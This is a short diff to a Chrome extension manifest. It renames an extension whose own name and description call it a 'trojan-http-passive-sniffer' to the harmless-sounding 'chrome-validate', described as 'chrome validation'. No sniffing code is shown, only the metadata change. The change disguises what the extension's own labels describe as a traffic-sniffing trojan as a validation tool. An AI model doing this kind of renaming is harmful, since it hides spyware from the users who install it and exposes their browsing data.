@@ -1,7 +1,7 @@
 {
-    "name": "chrome-trojan-http-passive-sniffer",
+    "name": "chrome-validate",
     "version": "1.0.0",
-    "description": "trojan-http-passive-sniffer",
+    "description": "chrome validation",
     "icons": {
       "16": "/app/img/ico.png",
       "48": "/app/img/ico.png",
